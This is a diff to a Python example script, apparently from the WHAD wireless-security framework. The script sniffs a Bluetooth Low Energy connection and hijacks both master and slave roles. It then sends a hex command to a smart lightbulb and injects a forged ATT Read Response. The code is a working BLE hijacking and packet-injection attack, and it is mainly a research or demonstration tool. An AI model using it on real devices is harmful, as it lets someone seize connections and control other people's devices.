@@ -1,11 +1,11 @@
 from helpers import load_whad_path
 load_whad_path()
 
-from whad.domain.ble import Sniffer, Hijacker, Central
+from whad.domain.ble import Sniffer, Hijacker, Central, Peripheral
 from whad.device.uart import UartDevice
 from time import time,sleep
 from whad.domain.ble.attribute import UUID
-from scapy.all import BTLE_DATA, L2CAP_Hdr, ATT_Hdr, ATT_Write_Request
+from scapy.all import BTLE_DATA, L2CAP_Hdr, ATT_Hdr, ATT_Read_Response
 import sys
 
 if __name__ == '__main__':
@@ -24,10 +24,12 @@ if __name__ == '__main__':
             print("Press enter to hijack.")
             input()
             hijacker = sniffer.available_actions(Hijacker)[0]
-            success = hijacker.hijack(master=True, slave=False)
+            success = hijacker.hijack(master=True, slave=True)
             if success:
-                print("Master successfully hijacked !")
+                print("Master and Slave successfully hijacked !")
                 central = hijacker.available_actions(Central)[0]
+                peripheral = hijacker.available_actions(Peripheral)[0]
+
                 periph = central.peripheral()
                 periph.discover()
 
@@ -39,6 +41,9 @@ if __name__ == '__main__':
                     print("Press enter to turn on the lightbulb.")
                     input()
                     c.write(bytes.fromhex("5510010d0a"))
+                    print("Press enter to send a Read Response.")
+                    input()
+                    peripheral.send_pdu(BTLE_DATA()/L2CAP_Hdr()/ATT_Hdr()/ATT_Read_Response(value=b"ABCD"))
 
             else:
                 print("Fail, exiting...")
